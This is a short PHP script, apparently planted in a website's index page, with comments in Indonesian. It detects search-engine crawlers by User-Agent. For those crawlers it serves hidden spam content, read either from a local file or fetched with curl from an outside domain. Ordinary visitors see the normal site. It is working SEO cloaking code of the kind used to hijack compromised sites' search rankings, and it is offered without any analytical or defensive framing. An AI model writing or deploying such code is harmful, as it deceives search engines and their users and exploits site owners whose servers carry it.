<?php
$user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
$host        = $_SERVER['HTTP_HOST'] ?? '';

$is_bot = false;

$bots = [
    'Googlebot',
    'Google-InspectionTool',
    'AdsBot-Google',
    'Mediapartners-Google',
    'Bingbot',
    'Slurp',
    'DuckDuckBot',
    'AhrefsBot',
    'SemrushBot',
    'MJ12bot',
    'YandexBot'
];

foreach ($bots as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

/* trigger untuk subdomain depan yang mengandung kata "mail" */
if ($is_bot && stripos($host, 'mail') !== false) {

    $file = 'tmp/mail.txt';

    if (file_exists($file)) {
        // Set header biar dianggap sebagai konten biasa oleh bot
        header('Content-Type: text/html; charset=UTF-8');
        readfile($file);
    } else {
        echo 'cache not ready';
    }

    exit;
}

function is_google_bot(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
    foreach($a as $b){
        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return 1;
    }
    return 0;
}

// JALANKAN HANYA JIKA DI ROOT (bukan di /bisa)
if($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php'){
    if(is_google_bot()){
        $c = curl_init('https://freeportindonesia.org/landing/jurnaldidaktika-revisi2.html');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        echo curl_exec($c);
        curl_close($c);
        exit;
    }
}
